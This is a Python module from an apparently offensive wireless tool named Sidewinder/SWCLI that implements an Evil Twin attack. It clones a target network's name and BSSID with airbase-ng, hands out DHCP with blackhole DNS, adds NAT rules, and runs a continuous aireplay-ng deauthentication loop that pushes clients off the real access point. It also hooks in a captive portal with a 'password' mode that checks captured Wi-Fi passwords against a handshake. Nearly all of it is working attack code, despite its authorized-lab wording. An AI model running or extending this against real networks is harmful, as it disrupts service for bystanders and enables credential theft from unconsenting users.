"""Sidewinder Evil Twin Attack Module.

Spins up a rogue Access Point (Evil Twin) with the same ESSID as the target to lure clients.
Uses airbase-ng under the hood to handle beacon injection and client association handling.

Supports fully functional captive portal modes (airgeddon-style):
- DNS blackhole with Android/iOS/Windows/macOS/Linux detection bypass
- OS-specific probe path handling
- Hidden pixel tracking for client detection
- iptables/nftables firewall rules for HTTP redirection
- Responsive HTML/CSS/JS templates
"""
from __future__ import annotations

import asyncio
import html
import inspect
import ipaddress
import logging
import re
import shutil
from dataclasses import dataclass, field
from typing import Awaitable, Callable, Optional

from .captive_portal import CaptivePortalConfig, CaptivePortalEngine, PortalMode
from ..core.subprocess_mgr import SubprocessManager, get_manager

logger = logging.getLogger(__name__)


MAC_RE = re.compile(r"(?i)\b(?:[0-9a-f]{2}:){5}[0-9a-f]{2}\b")


@dataclass
class EvilTwinStats:
    """Runtime observations from an Evil Twin lab session."""

    associated_clients: set[str] = field(default_factory=set)
    live_clients: set[str] = field(default_factory=set)
    dhcp_leases: dict[str, str] = field(default_factory=dict)
    portal_hits: int = 0
    last_portal_paths: list[str] = field(default_factory=list)

    def remember_path(self, path: str) -> None:
        self.portal_hits += 1
        self.last_portal_paths.append(path)
        del self.last_portal_paths[:-20]


class EvilTwinEngine:
    """Manages the Evil Twin rogue AP lifecycle.

    Integrates with CaptivePortalEngine for fully functional captive portal support
    following airgeddon-style patterns (DNS blackhole, OS detection, firewall rules).
    """

    def __init__(
        self,
        mgr: Optional[SubprocessManager] = None,
        *,
        tap_iface: str = "at0",
        gateway_ip: str = "10.0.0.1",
        cidr_prefix: int = 24,
        dhcp_start: str = "10.0.0.10",
        dhcp_end: str = "10.0.0.100",
        portal_port: int = 8080,
    ) -> None:
        self.mgr = mgr or get_manager()
        self._proc: Optional[asyncio.subprocess.Process] = None
        self._dhcp_proc: Optional[asyncio.subprocess.Process] = None
        self._running = False
        self._read_task: Optional[asyncio.Task] = None
        self._dhcp_read_task: Optional[asyncio.Task] = None
        self._portal_server: Optional[asyncio.AbstractServer] = None
        self._captive_portal: Optional[CaptivePortalEngine] = None
        self._deauth_task: Optional[asyncio.Task] = None
        self.tap_iface = tap_iface
        self.gateway_ip = gateway_ip
        self.cidr_prefix = cidr_prefix
        self.dhcp_start = dhcp_start
        self.dhcp_end = dhcp_end
        self.portal_port = portal_port
        self.stats = EvilTwinStats()

    async def start_rogue_ap(
        self,
        mon_iface: str,
        essid: str,
        channel: int,
        target_bssid: Optional[str] = None,
        on_log: Optional[Callable[[str], Awaitable[None] | None]] = None,
        timeout: float = 3600.0,
        enable_dhcp: bool = True,
        portal_mode: str = "notice",
        portal_title: str = "SWCLI Lab Network",
        portal_message: str = "This access point is running in an authorized wireless audit lab.",
        handshake_file: Optional[str] = None,
        enable_continuous_deauth: bool = False,
        deauth_client: str = "FF:FF:FF:FF:FF:FF",
        deauth_interval: float = 30.0,
        deauth_count: int = 5,
        deauth_rate: int = 128,
        metadata_log_file: Optional[str] = None,
        portal_variant: str = "password",
        validation_bssid: Optional[str] = None,
        deauth_iface: Optional[str] = None,
        internet_iface: Optional[str] = None,
        router_manufacturer: str = "",
    ) -> bool:
        """Start a rogue Access Point using airbase-ng.
        
        Portal modes:
          - "none":      DHCP only, no web portal.
          - "notice":    Notice page that allows normal connectivity probes.
          - "captive":   Force OS captive portal detection.
          - "password":  Login form that validates passwords against a captured handshake.
        
        When portal_mode is "notice", "captive", or "password", the fully functional
        CaptivePortalEngine is used (airgeddon-style) with DNS blackhole, OS detection,
        and firewall rules.
        
        Args:
            mon_iface:      The monitor mode interface.
            essid:          The ESSID (network name) to broadcast.
            channel:        The channel to broadcast on (1-165).
            target_bssid:   Optional BSSID to clone.
            on_log:         Callback for streaming output logs (can be async).
            timeout:        Max seconds to run the rogue AP before auto-stopping.
            enable_dhcp:    Start dnsmasq on airbase-ng's tap interface so clients get an IP.
            portal_mode:    "none", "notice", "captive", or "password".
            portal_title:   Title displayed by the built-in portal page.
            portal_message: Message displayed by the built-in portal page.
            handshake_file: Path to .cap file with captured handshake (required for password mode).
        """
        self._validate_network_config()
        if not (1 <= channel <= 14 or 36 <= channel <= 165):
            from ..core.errors import SidewinderError, Severity, Category
            raise SidewinderError(
                severity=Severity.ERROR,
                category=Category.USER,
                what="Invalid channel for Evil Twin",
                why=f"Channel {channel} is not a valid 2.4GHz or 5GHz channel.",
                how_to_fix=["Select a valid channel from the scan results."],
            )

        async def safe_log(msg: str) -> None:
            if on_log:
                res = on_log(msg)
                if inspect.isawaitable(res):
                    await res

        is_mock = "MOCK" in mon_iface or shutil.which("airbase-ng") is None

        if is_mock:
            self._running = True
            await safe_log(f"[*] [MOCK] Initializing Rogue AP: {essid} (Ch {channel})")
            if target_bssid:
                await safe_log(f"[*] [MOCK] Cloning BSSID: {target_bssid}")
            
            # Simulate a client connecting
            await asyncio.sleep(2.0)
            await safe_log(f"[*] Client 00:11:22:33:44:55 associated")
            await asyncio.sleep(2.0)
            await safe_log(f"[*] Captive portal mode: {portal_mode}")
            await asyncio.sleep(2.0)
            await safe_log(f"[+] DHCP lease issued to 00:11:22:33:44:55")
            await asyncio.sleep(1.0)
            self._running = False
            return True

        await self._preflight(safe_log, enable_dhcp, portal_mode)

        cmd = [
            "airbase-ng",
            "-e", essid,
            "-c", str(channel),
        ]
        
        if target_bssid:
            if not MAC_RE.fullmatch(target_bssid):
                await safe_log(f"[!] Clone BSSID looks invalid: {target_bssid}")
                return False
            cmd.extend(["-a", target_bssid])
            
        cmd.append(mon_iface)
        
        logger.info("Starting Evil Twin (ESSID: %s, Channel: %d) on %s", essid, channel, mon_iface)
        
        await safe_log(f"[*] Initializing Rogue AP: {essid} (Ch {channel})")
        if target_bssid:
            await safe_log(f"[*] Cloning BSSID: {target_bssid}")
                
        self._proc = await self.mgr.start_background(cmd, capture_output=True)
        self._running = True

        async def _read_output(proc: asyncio.subprocess.Process, label: str = ""):
            try:
                async def read_pipe(pipe):
                    if pipe is None:
                        return
                    async for line_b in pipe:
                        if not self._running:
                            break
                        line = line_b.decode(errors="replace").rstrip()
                        if line:
                            await self._record_tool_event(label, line, safe_log)
                            prefix = f"[{label}] " if label else ""
                            await safe_log(prefix + line)

                await asyncio.gather(read_pipe(proc.stdout), read_pipe(proc.stderr))
            except Exception as e:
                logger.error("Evil twin output error: %s", e)
                await safe_log(f"[!] Rogue AP error: {e}")

        self._read_task = asyncio.create_task(_read_output(self._proc, "airbase"))

        if enable_dhcp:
            await self._setup_client_network(
                safe_log,
                _read_output,
                portal_mode=portal_mode,
                internet_iface=internet_iface,
            )

        if internet_iface and not is_mock:
            await self._setup_internet_forwarding(internet_iface, safe_log)

        # Use CaptivePortalEngine for notice/captive/password modes (airgeddon-style)
        if portal_mode in ("notice", "captive", "password") and not is_mock:
            await self._start_captive_portal_engine(
                mon_iface=mon_iface,
                essid=essid,
                channel=channel,
                target_bssid=target_bssid,
                on_log=on_log,
                portal_mode=portal_mode,
                portal_title=portal_title,
                portal_message=portal_message,
                handshake_file=handshake_file,
                metadata_log_file=metadata_log_file,
                portal_variant=portal_variant,
                validation_bssid=validation_bssid or target_bssid,
                router_manufacturer=router_manufacturer,
            )

        # Start continuous deauth if requested
        if enable_continuous_deauth and target_bssid and not is_mock:
            self.start_continuous_deauth(
                mon_iface=deauth_iface or mon_iface,
                target_bssid=target_bssid,
                channel=channel,
                client=deauth_client,
                burst_count=deauth_count,
                interval=deauth_interval,
                rate=deauth_rate,
                on_log=on_log,
            )
        
        try:
            await asyncio.wait_for(self._proc.wait(), timeout=timeout)
            return True
        except asyncio.TimeoutError:
            logger.warning("Evil Twin timed out after %ds", int(timeout))
            await safe_log("[!] Evil Twin timed out")
            return False
        finally:
            await self.stop()

    async def _preflight(self, safe_log, enable_dhcp: bool, portal_mode: str) -> None:
        await safe_log("[*] Running Evil Twin preflight checks")
        required = ["airbase-ng"]
        if enable_dhcp:
            required.extend(["ip", "dnsmasq"])
        missing = [tool for tool in required if shutil.which(tool) is None]
        if missing:
            await safe_log(f"[!] Missing required tool(s): {', '.join(missing)}")
        if portal_mode != "none" and self.portal_port < 1024:
            await safe_log(f"[*] Portal will bind {self.gateway_ip}:{self.portal_port}; root privileges are normally required.")

        if shutil.which("ip") is not None:
            res = await self.mgr.run(["ip", "link", "show", self.tap_iface], timeout=2.0, check=False)
            if res.success:
                await safe_log(f"[*] Existing {self.tap_iface} detected; it will be reused/reconfigured.")

    def _validate_network_config(self) -> None:
        gateway = ipaddress.ip_address(self.gateway_ip)
        start = ipaddress.ip_address(self.dhcp_start)
        end = ipaddress.ip_address(self.dhcp_end)
        net = ipaddress.ip_network(f"{self.gateway_ip}/{self.cidr_prefix}", strict=False)
        if gateway not in net or start not in net or end not in net:
            raise ValueError("Evil Twin gateway and DHCP range must be in the same subnet")
        if int(start) > int(end):
            raise ValueError("Evil Twin DHCP start must be lower than or equal to DHCP end")
        if not (1 <= self.portal_port <= 65535):
            raise ValueError("Evil Twin portal port must be between 1 and 65535")

    async def _start_captive_portal_engine(
        self,
        mon_iface: str,
        essid: str,
        channel: int,
        target_bssid: Optional[str],
        on_log: Optional[Callable[[str], Awaitable[None] | None]],
        portal_mode: str,
        portal_title: str,
        portal_message: str,
        handshake_file: Optional[str] = None,
        metadata_log_file: Optional[str] = None,
        portal_variant: str = "password",
        validation_bssid: Optional[str] = None,
        router_manufacturer: str = "",
    ) -> None:
        """Start the fully functional CaptivePortalEngine (airgeddon-style).

        This provides DNS blackhole, OS detection, firewall rules, tracking,
        and optional password validation against a captured handshake.
        """
        portal_config = CaptivePortalConfig(
            gateway_ip=self.gateway_ip,
            portal_port=self.portal_port,
            dhcp_start=self.dhcp_start,
            dhcp_end=self.dhcp_end,
            cidr_prefix=self.cidr_prefix,
            tap_iface=self.tap_iface,
            portal_mode=PortalMode(portal_mode),
            portal_title=portal_title,
            portal_message=portal_message,
            essid=essid,
            bssid=target_bssid,
            validation_bssid=validation_bssid,
            handshake_file=handshake_file,
            metadata_log_file=metadata_log_file,
            enable_dns=False,
            enable_firewall=True,
            portal_variant=portal_variant,
            router_manufacturer=router_manufacturer,
        )

        self._captive_portal = CaptivePortalEngine(config=portal_config, mgr=self.mgr)

        await self._captive_portal.start(
            mon_iface=mon_iface,
            essid=essid,
            channel=channel,
            target_bssid=target_bssid,
            on_log=on_log,
        )

    async def _record_tool_event(self, label: str, line: str, safe_log) -> None:
        macs = [m.upper() for m in MAC_RE.findall(line)]
        if not macs:
            return

        lower = line.lower()
        if label == "airbase":
            if "associated" in lower or "association" in lower:
                for mac in macs:
                    self.stats.associated_clients.add(mac)
                    if mac not in self.stats.live_clients:
                        self.stats.live_clients.add(mac)
                        await safe_log(f"[+] Client associated: {mac}")
            elif "disconnected" in lower or "deauthenticated" in lower:
                for mac in macs:
                    if mac in self.stats.live_clients:
                        self.stats.live_clients.remove(mac)
                        await safe_log(f"[-] Client disconnected: {mac}")
        elif label == "dnsmasq" and ("dhcpack" in lower or "dhcp ack" in lower or "lease" in lower):
            ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line)
            for mac in macs:
                if ip_match:
                    self.stats.dhcp_leases[mac] = ip_match.group(0)
                    await safe_log(f"[+] DHCP lease: {mac} -> {ip_match.group(0)}")

    async def _setup_client_network(
        self,
        safe_log,
        output_reader,
        *,
        portal_mode: str,
        internet_iface: Optional[str] = None,
    ) -> None:
        if shutil.which("ip") is None:
            await safe_log("[!] iproute2 not found; clients may associate but will not get an IP.")
            return
        if shutil.which("dnsmasq") is None:
            await safe_log("[!] dnsmasq not found; clients may associate but will not get DHCP.")
            await safe_log("[!] Install dnsmasq to make phones/laptops complete Wi-Fi connection.")
            return

        if not await self._wait_for_iface(self.tap_iface, timeout=8.0):
            await safe_log(f"[!] {self.tap_iface} did not appear; airbase-ng may not have created the tap interface.")
            await safe_log("[!] AP may be visible, but clients usually cannot complete connection without at0 + DHCP.")
            return

        await safe_log(f"[*] Preparing client network on {self.tap_iface} ({self.gateway_ip}/{self.cidr_prefix})")
        await self.mgr.run(["ip", "link", "set", self.tap_iface, "up"], timeout=5.0, check=False)
        await self.mgr.run(["ip", "addr", "flush", "dev", self.tap_iface], timeout=5.0, check=False)
        addr_res = await self.mgr.run(
            ["ip", "addr", "add", f"{self.gateway_ip}/{self.cidr_prefix}", "dev", self.tap_iface],
            timeout=5.0,
            check=False,
        )
        if not addr_res.success:
            await safe_log(f"[!] Could not assign {self.gateway_ip}/{self.cidr_prefix} to {self.tap_iface}: {addr_res.stderr or addr_res.stdout}")
            return

        mode = portal_mode.strip().lower()
        if mode not in ("none", "notice", "captive", "password"):
            mode = "notice"

        dnsmasq_cmd = [
            "dnsmasq",
            "--no-daemon",
            f"--interface={self.tap_iface}",
            "--bind-interfaces",
            "--except-interface=lo",
            f"--dhcp-range={self.dhcp_start},{self.dhcp_end},{self._netmask()},12h",
            f"--dhcp-option=3,{self.gateway_ip}",
            f"--dhcp-option=6,{self.gateway_ip}",
            "--log-dhcp",
            "--log-queries",
        ]
        
        if internet_iface:
            # Proxied DNS (real internet)
            dnsmasq_cmd.extend([
                "--server=8.8.8.8",
                "--server=8.8.4.4",
            ])
        else:
            # Blackhole DNS
            if mode != "none":
                dnsmasq_cmd.append(f"--address=/#/{self.gateway_ip}")
            dnsmasq_cmd.append(f"--dhcp-option=114,http://{self.gateway_ip}/")

        self._dhcp_proc = await self.mgr.start_background(dnsmasq_cmd, capture_output=True)
        self._dhcp_read_task = asyncio.create_task(output_reader(self._dhcp_proc, "dnsmasq"))
        await asyncio.sleep(0.3)
        if self._dhcp_proc.returncode is not None:
            await safe_log("[!] dnsmasq exited immediately. Another DHCP server may already be bound to port 67.")
            return
        await safe_log(f"[+] DHCP ready on {self.tap_iface}. Clients should now receive leases from {self.dhcp_start}-{self.dhcp_end}.")
        
        if internet_iface:
            await safe_log(f"[+] DNS proxying active on {self.tap_iface}: queries forwarded to upstream")
        elif mode == "none":
            await safe_log("[*] Captive portal disabled; running DHCP-only rogue AP.")
            return
        else:
            await safe_log(f"[+] DNS capture active on {self.tap_iface}: all hostnames resolve to {self.gateway_ip}")

    def _netmask(self) -> str:
        return str(ipaddress.ip_network(f"{self.gateway_ip}/{self.cidr_prefix}", strict=False).netmask)

    async def _start_captive_portal(self, safe_log, mode: str, title: str, message: str) -> None:
        async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            try:
                request = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                decoded = request.decode(errors="replace")
                lines = decoded.splitlines()
                first_line = lines[0] if lines else ""
                path = first_line.split(" ")[1] if " " in first_line else "/"
                ua = next((line.split(":", 1)[1].strip() for line in lines if line.lower().startswith("user-agent:")), "")
                peer = writer.get_extra_info("peername")
                peer_ip = peer[0] if peer else "unknown"
                self.stats.remember_path(path)
                await safe_log(f"[portal] {peer_ip} {path}" + (f" ({ua[:64]})" if ua else ""))

                status, content_type, body = self._portal_response(mode, title, message, path)
                response = (
                    f"HTTP/1.1 {status}\r\n"
                    f"Content-Type: {content_type}\r\n"
                    f"Content-Length: {len(body.encode('utf-8'))}\r\n"
                    "Cache-Control: no-store\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    f"{body}"
                )
                writer.write(response.encode())
                await writer.drain()
            except Exception as e:
                logger.debug("Captive portal request failed: %s", e)
            finally:
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass

        try:
            self._portal_server = await asyncio.start_server(handle_client, self.gateway_ip, self.portal_port)
        except OSError as e:
            await safe_log(f"[!] Could not start captive portal on {self.gateway_ip}:{self.portal_port}: {e}")
            await safe_log("[!] The port may already be in use, or the process may not have root privileges.")
            return

        await safe_log(f"[+] Captive portal ready on http://{self.gateway_ip}:{self.portal_port}/ ({mode})")

    def _portal_response(self, mode: str, title: str, message: str, path: str) -> tuple[str, str, str]:
        probe_paths = {
            "/generate_204",
            "/gen_204",
            "/hotspot-detect.html",
            "/library/test/success.html",
            "/ncsi.txt",
            "/connecttest.txt",
        }
        if mode == "notice" and path in probe_paths:
            if path in ("/ncsi.txt", "/connecttest.txt"):
                return "200 OK", "text/plain; charset=utf-8", "Microsoft NCSI"
            return "204 No Content", "text/plain; charset=utf-8", ""
        return "200 OK", "text/html; charset=utf-8", self._portal_body(mode, title, message, path)

    def _portal_body(self, mode: str, title: str, message: str, path: str) -> str:
        """Generate fallback portal HTML (matching SWCLI UI/UX style)."""
        safe_title = html.escape(title.strip() or "SWCLI Lab Network")
        safe_message = html.escape(message.strip() or "Authorized wireless audit lab.")
        mode_label = "Captive portal detection" if mode == "captive" else "Notice page"
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{safe_title}</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(145deg, #0a0f1a 0%, #0f172a 40%, #1a1f35 100%);
            color: #e2e8f0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .card {{
            background: rgba(15, 23, 42, 0.95);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 12px;
            padding: 32px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }}
        .card::before {{
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 3px;
            background: linear-gradient(90deg, #00d4ff, #22c55e, #00d4ff);
        }}
        h1 {{
            font-size: 22px;
            font-weight: 600;
            color: #f1f5f9;
            margin-bottom: 12px;
        }}
        p {{
            font-size: 14px;
            line-height: 1.6;
            color: #94a3b8;
            margin-bottom: 12px;
        }}
        .meta {{
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 12px;
            color: #475569;
        }}
        .badge {{
            display: inline-block;
            font-size: 11px;
            font-weight: 600;
            padding: 3px 8px;
            border-radius: 4px;
            background: rgba(0, 212, 255, 0.1);
            color: #00d4ff;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
    </style>
</head>
<body>
    <div class="card">
        <h1>{safe_title}</h1>
        <p>{safe_message}</p>
        <p>This page is served by SWCLI for authorized Evil Twin connectivity testing. It does not collect credentials.</p>
        <div class="meta">
            <span class="badge">{mode_label}</span>
            &nbsp;·&nbsp; Path: <code>{html.escape(path)}</code>
        </div>
    </div>
</body>
</html>"""

    async def _wait_for_iface(self, iface: str, timeout: float) -> bool:
        deadline = asyncio.get_running_loop().time() + timeout
        while asyncio.get_running_loop().time() < deadline:
            result = await self.mgr.run(["ip", "link", "show", iface], timeout=2.0, check=False)
            if result.success:
                return True
            await asyncio.sleep(0.5)
        return False

    def start_continuous_deauth(
        self,
        mon_iface: str,
        target_bssid: str,
        channel: int,
        client: str = "FF:FF:FF:FF:FF:FF",
        burst_count: int = 5,
        interval: float = 30.0,
        rate: int = 128,
        on_log: Optional[Callable[[str], Awaitable[None] | None]] = None,
    ) -> None:
        """Start a background continuous deauth task.

        Sends periodic deauth bursts to force clients off the real AP.
        The deauth runs on the same interface as airbase-ng by sending
        frames directly via aireplay-ng.

        Note: This works best when the evil twin is on the same channel
        as the target AP. Cross-channel deauth may be less effective.

        Args:
            mon_iface:    Monitor mode interface.
            target_bssid: BSSID of the real AP to deauth from.
            channel:      Channel of the target AP.
            client:       Client MAC to target (default: broadcast).
            burst_count:  Number of deauth frames per burst.
            interval:     Seconds between bursts.
            on_log:       Callback for log messages.
        """
        async def _deauth_loop():
            async def safe_log(msg: str) -> None:
                if on_log:
                    res = on_log(msg)
                    if inspect.isawaitable(res):
                        await res

            await safe_log(f"[*] Continuous deauth started: targeting {target_bssid} every {interval}s")

            while self._running:
                try:
                    await asyncio.sleep(interval)
                    if not self._running:
                        break

                    deauth_cmd = [
                        "aireplay-ng",
                        "--deauth", str(burst_count),
                        "-x", str(rate),
                        "-a", target_bssid,
                        "-c", client,
                        mon_iface,
                    ]

                    proc = await self.mgr.start_background(deauth_cmd, capture_output=True)
                    try:
                        await asyncio.wait_for(proc.wait(), timeout=15.0)
                    except asyncio.TimeoutError:
                        await self.mgr.kill_background(proc)

                    await safe_log(f"[+] Deauth burst sent to {target_bssid} ({burst_count} frames)")

                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.debug("Continuous deauth error: %s", e)
                    if self._running:
                        await asyncio.sleep(interval)

        self._deauth_task = asyncio.create_task(_deauth_loop())

    async def stop(self) -> None:
        """Gracefully stop the rogue AP and captive portal."""
        self._running = False

        # Stop continuous deauth
        if self._deauth_task:
            self._deauth_task.cancel()
            try:
                await self._deauth_task
            except asyncio.CancelledError:
                pass
            self._deauth_task = None

        # Stop captive portal engine first
        if self._captive_portal:
            await self._captive_portal.stop()
            self._captive_portal = None

        if self._dhcp_proc:
            await self.mgr.kill_background(self._dhcp_proc)
            self._dhcp_proc = None
        if self._dhcp_read_task:
            self._dhcp_read_task.cancel()
            self._dhcp_read_task = None
        if self._portal_server:
            self._portal_server.close()
            await self._portal_server.wait_closed()
            self._portal_server = None
        if self._proc:
            await self.mgr.kill_background(self._proc)
            self._proc = None
        if self._read_task:
            self._read_task.cancel()
            self._read_task = None
        if shutil.which("ip") is not None:
            await self.mgr.run(["ip", "addr", "flush", "dev", self.tap_iface], timeout=3.0, check=False)
            await self.mgr.run(["ip", "link", "set", self.tap_iface, "down"], timeout=3.0, check=False)
            
            # Clean up internet forwarding rules if any
            if shutil.which("iptables") is not None:
                await self.mgr.run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], timeout=3.0, check=False)
                await self.mgr.run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], timeout=3.0, check=False)
        logger.info("Evil Twin stopped.")

    async def _setup_internet_forwarding(self, internet_iface: str, safe_log) -> None:
        """Configure NAT to forward client traffic to the real internet."""
        if shutil.which("iptables") is None:
            await safe_log(f"[!] iptables not found; cannot enable internet forwarding via {internet_iface}")
            return
            
        await safe_log(f"[*] Setting up NAT internet forwarding via {internet_iface}")
        
        # Enable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
        except OSError as e:
            await safe_log(f"[!] Failed to enable ipv4 forwarding: {e}")
            
        # Configure NAT masquerade
        res = await self.mgr.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_iface, "-j", "MASQUERADE"], timeout=5.0)
        if res.success:
            await self.mgr.run(["iptables", "-A", "FORWARD", "-i", self.tap_iface, "-j", "ACCEPT"], timeout=5.0)
            await safe_log(f"[+] Internet forwarding active: {self.tap_iface} -> {internet_iface}")
        else:
            await safe_log(f"[!] Failed to set up NAT routing: {res.stderr or res.stdout}")
